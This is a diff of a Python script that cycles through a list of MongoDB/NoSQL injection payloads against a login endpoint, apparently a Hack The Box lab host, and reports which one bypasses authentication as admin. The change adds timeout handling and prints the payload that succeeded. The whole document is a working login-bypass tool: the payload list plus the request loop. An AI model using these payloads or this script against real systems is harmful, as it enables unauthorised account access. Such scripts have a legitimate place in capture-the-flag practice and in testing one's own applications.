@@ -7,17 +7,35 @@ import requests
 url = 'http://shoppy.htb/login'         #Change this variable based on URL 
 headers = {'content-type': 'application/json'}
 
-nosql_list = ("||'1==1", "true, $where: '1 == 1'" ,", $where: '1 == 1'", "$where: '1 == 1'", "', $where: '1 == 1'", "1, $where: '1 == 1'", "{ $ne: 1 }", "', $or: [ {}, { 'a':'a", "' } ], $comment:'successful MongoDB injection'", "db.injection.insert({success:1});", "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1", "|| 1==1", "' && this.password.match(/.*/)//+%00", "' && this.passwordzz.match(/.*/)//+%00", "'%20%26%26%20this.password.match(/.*/)//+%00", "'%20%26%26%20this.passwordzz.match(/.*/)//+%00", "{$gt: ''}", "[$ne]=1)" )
+nosql_list = ("true, $where: '1 == 1" ,
+", $where: '1 == 1", "$where: '1 == 1", 
+", $where: '1 == 1'", 
+"1, $where: '1 == 1'", 
+"{ $ne: 1 }", 
+", $or: [ {}, { 'a':'a", 
+" } ], $comment:'successful MongoDB injection'", 
+"db.injection.insert({success:1});", 
+"db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1", 
+"|| '1==1", 
+" && this.password.match(/.*/)//+%00", 
+" && this.passwordzz.match(/.*/)//+%00", 
+"%20%26%26%20this.password.match(/.*/)//+%00", 
+"%20%26%26%20this.passwordzz.match(/.*/)//+%00", 
+"{$gt: ''}", 
+"[$ne]=1)" 
+) 
 
-for x in nosql_list:
-        user = {'username': "admin'%s" % x,
-                'password': 'fake'}
+for inject in nosql_list:
+        user = {'username': "admin'%s" % inject,
+                'password': ''}
         inject = "'||'1==1"
         payload = user
-        
-        r = requests.post(url=url, json=payload, headers=headers, timeout=3)
-        
+        try:    # Fix for timeout, except might be set up imporperly
+                r = requests.post(url=url, json=payload, headers=headers, timeout=3)
+        except requests.exceptions.Timeout:
+                print("Time out")
+                continue
         if r.status_code == 200:
-                print('Login Bypassed!')
+                print("Login Bypassed with admin'%s!" % inject)
         else:
                 print('Login Not Bypassed')
